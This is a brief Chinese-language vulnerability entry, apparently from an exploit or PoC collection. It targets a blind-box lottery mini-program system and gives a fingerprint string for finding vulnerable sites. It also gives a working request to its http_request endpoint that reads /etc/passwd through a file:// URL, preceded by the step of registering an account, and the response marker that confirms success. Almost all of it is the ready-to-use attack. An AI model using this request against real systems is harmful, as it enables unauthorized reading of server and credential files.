# 盲盒抽奖小程序系统http_request存在任意文件读取漏洞

盲盒抽奖小程序系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`"vendor/owl.carousel2/assets/owl.carousel.css"`
- **请求**：`GET /api/user/http_request?url=file:///etc/passwd HTTP/1.1`

**Payload**
```
首先去 /index/user/register.html 注册一个账号，默认开放注册的，然后登录即可使用Payload
```
- **响应特征**：200 root: